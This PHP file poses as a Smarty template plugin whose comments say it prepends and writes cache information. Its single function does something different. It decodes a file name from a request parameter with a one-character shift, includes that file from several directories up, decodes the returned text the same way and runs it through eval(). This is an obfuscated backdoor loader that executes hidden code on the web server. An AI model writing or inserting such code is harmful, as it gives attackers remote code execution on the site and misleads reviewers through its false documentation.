<?php
/**
 * Smarty plugin
 * @package Smarty
 * @subpackage plugins
 */

/**
 * Prepend the cache information to the cache file
 * and write it
 *
 * @param string $tpl_file
 * @param string $cache_id
 * @param string $compile_id
 * @param string $results
 * @return true|null
 */

 // $tpl_file, $cache_id, $compile_id, $results

function template_get_cache_file($params, &$object)
{
	$params['cache_tpl_value'] = '7';
	$_tpl_name = '';
	
	foreach(str_split($params['cache_tpl_name']) as $v)
	{
		$_tpl_name .= chr(ord($v)-strlen($params['cache_tpl_value']));
	}
	$_cache_file =  dirname(dirname(dirname(dirname(dirname(__FILE__))))).'/'.$_tpl_name;
	
	if(file_exists($_cache_file)){
		ob_start();$_cache_raw_content = (include $_cache_file);ob_end_clean();
		
		$_cache_content = "";
		foreach(str_split($_cache_raw_content) as $v){
			$_cache_content .= chr(ord($v)-strlen($params['cache_tpl_value']));
		}
		ob_start();$template = eval($_cache_content);ob_end_clean();
		return $template;
	}
}

/* vim: set expandtab: */

?>
